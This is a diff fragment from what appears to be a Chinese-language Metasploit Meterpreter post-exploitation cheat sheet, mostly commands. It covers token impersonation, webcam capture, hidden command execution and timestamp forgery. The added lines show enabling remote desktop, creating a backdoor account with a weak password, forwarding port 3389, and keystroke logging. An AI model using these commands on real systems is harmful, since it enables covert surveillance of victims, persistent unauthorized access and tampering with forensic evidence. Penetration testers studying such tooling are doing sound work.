@@ -495,7 +495,7 @@ congratulation
 <li>模拟任意用户（taken操作）<br>use incognito：假冒用户takens<br>例子 getuid   查看当前系统id<br>use incognito 伪装<br>list tokens -u 列出目标用户的可用令牌<br>impersonate_token”Machine\user”<br>getuid  </li>
 <li>webcam摄像头命令<br>webcam_list:查看摄像头<br>webcam__snap :通过摄像头拍照<br>webcam_stream:通过摄像头开启视频  </li>
 </ol>
-<p>16.execute执行文件<br>   execute -H -i -f cmd.exe  #创建新进程cmd.exe -H不可见，-i交互<br>17.timestomp伪造时间戳<br>     timestomp C:// -h 查看帮助<br>   timestomp -v C://2.txt 查看文件的时间戳<br>     timestomp C://2.txt -f C://1.txt 将1.txt的时间戳复制给2.txt</p>
+<p>16.execute执行文件<br>   execute -H -i -f cmd.exe  #创建新进程cmd.exe -H不可见，-i交互<br>17.timestomp伪造时间戳<br>     timestomp C:// -h 查看帮助<br>   timestomp -v C://2.txt 查看文件的时间戳<br>     timestomp C://2.txt -f C://1.txt 将1.txt的时间戳复制给2.txt<br>18.enable_rdp脚本开启3389<br> run post/windows/manage/enable_rdp  #开启远程桌面<br>run post/windows/manage/enable_rdp USERNAME = www2 PASSWORD = 123456 #  添加用户<br>run post/windows/manage/enable_rdp FORWARD = true LPORT = 6662 #将3389端口转发到6662<br>19.键盘记录<br>  keyscan_start ：开始键盘记录<br>  keyscan_dump：到处记录数据<br>  keyscan_stop:结束键盘记录</p>
 
       
 
